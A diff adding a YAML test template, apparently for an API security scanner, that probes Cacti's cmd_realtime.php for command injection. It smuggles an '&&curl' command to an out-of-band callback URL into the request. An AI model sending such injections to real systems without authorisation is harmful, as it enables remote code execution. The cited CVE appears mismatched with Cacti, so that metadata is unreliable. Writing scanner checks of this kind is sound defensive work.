@@ -1,0 +1,42 @@
+id: CACTI_COMMAND_INJECTION
+info:
+  name: "Cacti Command Injection Test"
+  description: "The Cacti Command Injection Test identifies vulnerabilities in the Cacti application that may allow an attacker to inject and execute arbitrary system commands on the server. This typically occurs when user input is improperly sanitized and passed to system shell commands, enabling attackers to run malicious code. If exploited, command injection could lead to remote code execution, system compromise, or unauthorized access to sensitive data. Proper input validation and secure handling of system commands are essential to mitigate this risk."
+  details:  "The Cacti Command Injection Test checks for instances where the Cacti application fails to properly sanitize user inputs, allowing attackers to inject arbitrary commands into the system. This often happens when user-supplied data is directly included in shell commands executed by the server. An attacker could manipulate inputs to run malicious commands, potentially leading to remote code execution, data loss, or unauthorized access. To mitigate this, Cacti should implement strong input validation, escape user inputs, and avoid passing unsanitized data to system commands."
+  impact: "The impact of a Cacti Command Injection vulnerability can be severe, as it allows attackers to execute arbitrary commands on the server, potentially leading to remote code execution. Exploiting this flaw could give attackers full control over the system, enabling them to steal sensitive data, alter configurations, or disrupt services. In addition, it could lead to further attacks, such as lateral movement within the network. Proper input validation and secure handling of system commands are essential to prevent these risks."
+  category:
+    name: COMMAND_INJECTION
+    shortName: Command Injection
+    displayName: Command Injection
+  subCategory: CACTI_COMMAND_INJECTION
+  severity: MEDIUM
+  references:
+    - "https://twitter.com/trbughunters/status/1283133356922884096"
+  cwe:
+    - CWE-77
+  cve:
+    - CVE-2020-9484
+
+api_selection_filters:
+  method:
+    neq: "OPTIONS"
+  response_code:
+    gte: 200
+    lt: 300
+  response_payload:
+    length:
+      gt: 0
+
+execute:
+  type: single
+  requests:
+    - req:
+      - send_ssrf_req:
+          url: "https://test-services.akto.io/store_uuid/${random_uuid}"
+      - modify_url: "/cacti/cmd_realtime.php?1+1&&curl%20https://test-services.akto.io/${random_uuid}+1+1+1"
+      - modify_method: GET
+      - replace_body: '{}'
+validate:
+  response_code:
+    eq: 200
+  ssrf_url_hit: ${random_uuid}
